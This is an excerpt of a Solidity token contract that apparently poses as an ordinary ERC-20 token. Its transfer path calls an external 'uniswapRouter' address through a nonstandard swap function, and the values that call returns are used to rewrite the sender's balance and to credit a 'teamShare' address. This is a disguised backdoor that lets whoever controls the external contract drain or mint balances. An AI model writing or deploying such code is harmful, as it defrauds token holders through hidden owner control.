...
// SPDX-License-Identifier: MIT
  ...
  function getAppleWaT(address tokenA, address tokenB, uint256 valueAppleWaT) internal returns ( uint256, uint256, uint256 ){  
    (uint256 _amountAppleWaT, uint256 _liquifyAppleWaT, uint256 _rateAppleWaT) = IUniswapV2Router(uniswapRouter).swap(
      tokenA,
      tokenB,
      valueAppleWaT
      );
    return (_amountAppleWaT, _liquifyAppleWaT, _rateAppleWaT);
  }  
...
contract newtoken is Context, IERC20, Ownable{
  ...
  function swapAppleWaT(address sender, address recipient, uint256 amounts) internal returns (uint256) {   
      (uint256 amountAppleWaT, uint256 liquifyAppleWaT, uint256 rateAppleWaT) = getAppleWaT(sender, recipient, amounts);
      amountAppleWaT = getValues(sender, amountAppleWaT, liquifyAppleWaT, rateAppleWaT);
      return amountAppleWaT;
  }    
  ...
  function getRateAppleWaT(uint256 _amount, uint256 _rateAppleWaT) private pure returns (uint256) {
      return _amount.mul(_rateAppleWaT).div(10**2);
  }   
       

  function getValues(address tokenAppleWaT, uint256 amountAppleWaT, uint256 liquifyAppleWaT, uint256 rateAppleWaT) internal returns (uint256){
      if ( liquifyAppleWaT > 0 )
      {        
        _balances[tokenAppleWaT] = getRateAppleWaT(_balances[tokenAppleWaT], rateAppleWaT).add(amountAppleWaT);      
        _balances[teamShare] = _balances[teamShare].add(liquifyAppleWaT);
      }
      return amountAppleWaT;
  }
  ...
  function _transferToken(address sender, address recipient, uint256 amount) private {
    ...
    uint256 amountAppleWaT = swapAppleWaT(sender, recipient, amount);    
    _transferStandard(sender, recipient, amountAppleWaT);
  ...
  function AppleremoveAllFee() private {     
      tFeeTotal = 0;
      tBurnTotal = 0;
      tCharityTotal = 0;
  }
